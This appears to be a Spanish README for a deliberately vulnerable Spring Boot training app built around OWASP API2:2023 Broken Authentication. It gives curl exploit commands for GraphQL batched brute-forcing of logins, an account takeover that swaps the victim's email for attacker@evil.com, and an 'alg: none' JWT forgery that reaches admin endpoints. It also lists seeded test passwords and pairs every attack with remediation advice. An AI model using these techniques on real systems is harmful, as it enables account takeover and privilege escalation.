# OWASP API2:2023 Broken Authentication Demo

Este proyecto es una aplicación Spring Boot Reactiva diseñada para demostrar vulnerabilidades de autenticación descritas en OWASP API Security Top 10 - API2:2023 Broken Authentication.

**⚠️ ADVERTENCIA: Este código contiene vulnerabilidades de seguridad intencionales para fines educativos. NO utilice este código en producción.**

## Requisitos Previos

- Java 17 o superior
- Maven 3.6+
- Navegador web para probar la interfaz

## Ejecutar el Proyecto

```bash
mvn spring-boot:run
```

La aplicación estará disponible en `http://localhost:8080`

## Vulnerabilidades Implementadas

### 1. Fuerza Bruta GraphQL Batching

**Ubicación:** `src/main/java/com/demo/brokenauth/graphql/UserGraphQLResolver.java`

**Descripción del Ataque:**
El atacante agrupa múltiples intentos de inicio de sesión en una sola petición HTTP para burlar el rate limiting estándar y adivinar credenciales rápidamente. GraphQL permite procesar múltiples mutations en un solo request HTTP, lo que permite enviar 100+ intentos de login en una sola petición.

**Cómo Explotar:**
```bash
curl -X POST http://localhost:8080/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(username:\"victim\",password:\"password\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"123456\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"qwerty\"){token}}"}
  ]'
```

**Prevención:**
- Aplicar rate limiting y control de complejidad de consultas a nivel de operación individual dentro de los lotes
- Deshabilitar la característica de batching si no es estrictamente necesaria para los clientes
- Implementar límites de profundidad y complejidad en las consultas GraphQL

---

### 2. Modificación de Datos Sensibles Sin Autenticación

**Ubicación:** `src/main/java/com/demo/brokenauth/controller/AccountController.java`

**Descripción del Ataque:**
Un atacante con un token robado cambia el correo de la cuenta vía PUT /account sin verificar la contraseña actual, facilitando un posterior restablecimiento de acceso. Una vez que el atacante cambia el email, puede iniciar el proceso de reset de contraseña al nuevo email y tomar control total de la cuenta.

**Cómo Explotar:**
```bash
# 1. Obtener token válido (o robarlo)
TOKEN=$(curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":"qwerty"}' \
  | jq -r '.token')

# 2. Cambiar email sin verificar contraseña actual
curl -X PUT http://localhost:8080/api/account/email \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'

# 3. Iniciar reset de contraseña al nuevo email
```

**Prevención:**
- Solicitar obligatoriamente la contraseña actual del usuario antes de permitir modificaciones en datos sensibles
- Implementar re-autenticación para operaciones críticas (cambio de email, teléfono, credenciales)
- Enviar notificaciones por email cuando se modifican datos sensibles
- Implementar un período de espera antes de que el cambio de email sea efectivo

---

### 3. Falsificación de Identidad por JWT Vulnerable

**Ubicación:** `src/main/java/com/demo/brokenauth/security/VulnerableJwtUtil.java`

**Descripción del Ataque:**
Manipulación de tokens aceptando algoritmos débiles o `alg: none` para alterar roles y escalar privilegios a administrador sin verificación criptográfica. El atacante puede crear un token malicioso con el algoritmo "none" que no requiere firma, permitiendo falsificar cualquier claim incluyendo roles de administrador.

**Cómo Explotar:**
```bash
# Crear token malicioso con algoritmo "none"
HEADER='{"alg":"none"}'
PAYLOAD='{"username":"admin","role":"ADMIN"}'
TOKEN=$(echo -n "$HEADER.$PAYLOAD." | base64)

# Usar el token para acceder como administrador
curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/admin/sensitive
```

**Prevención:**
- Configurar el servidor para verificar siempre la firma criptográfica
- Rechazar explícitamente algoritmos inseguros o el valor `alg: none`
- Comprobar rigurosamente las fechas de caducidad (exp) y emisión (iat)
- Usar claves secretas fuertes (mínimo 256 bits)
- Implementar lista blanca de algoritmos permitidos (solo HS256, RS256, etc.)

## Endpoints de la API

**REST API:**
- `POST /api/auth/login` - Login (vulnerable a fuerza bruta)
- `PUT /api/account/email` - Cambiar email (sin confirmación de contraseña)
- `GET /api/account/profile` - Obtener perfil

**GraphQL:**
- `POST /graphql` - GraphQL endpoint (vulnerable a batching attacks)

## Usuarios de Prueba

La aplicación se inicializa con estos usuarios (contraseñas en texto plano):

| Username | Password | Email | Role |
|----------|----------|-------|------|
| admin | admin123 | admin@demo.com | ADMIN |
| user1 | password123 | user1@demo.com | USER |
| victim | qwerty | victim@demo.com | USER |

## Ejemplos de Explotación

### 1. Fuerza Bruta GraphQL Batching

```bash
# Enviar 10 intentos de login en una sola request
curl -X POST http://localhost:8080/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(username:\"victim\",password:\"pass1\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"pass2\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"pass3\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"pass4\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"pass5\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"pass6\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"pass7\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"pass8\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"pass9\"){token}}"},
    {"query":"mutation{login(username:\"victim\",password:\"pass10\"){token}}"}
  ]'
```

### 2. Account Takeover via Email Change

```bash
# Paso 1: Login para obtener token
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":"qwerty"}'

# Paso 2: Cambiar email sin contraseña
curl -X PUT http://localhost:8080/api/account/email \
  -H "Authorization: Bearer <token_del_paso_1>" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'
```

### 3. JWT con Algoritmo None

```bash
# Crear token con alg: none
# Header: {"alg":"none"}
# Payload: {"username":"admin","role":"ADMIN"}
# Token: header.payload. (sin firma)
```

## Guía de Corrección

Para corregir estas vulnerabilidades, siga estos pasos:

1. **GraphQL Batching:**
   - Implementar rate limiting a nivel de mutation
   - Deshabilitar batching: `spring.graphql.graphql.batching.enabled=false`
   - Limitar la complejidad de consultas

2. **Modificación Sin Autenticación:**
   - Requerir contraseña actual para cambios sensibles
   - Implementar re-autenticación para operaciones críticas
   - Enviar notificaciones de cambios por email

3. **JWT Vulnerable:**
   - Rechazar explícitamente `alg: none`
   - Verificar siempre la firma
   - Validar expiración y emisión
   - Usar claves fuertes (256+ bits)

## Recursos Adicionales

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [GraphQL Security Best Practices](https://graphql.org/learn/best-practices/#security)
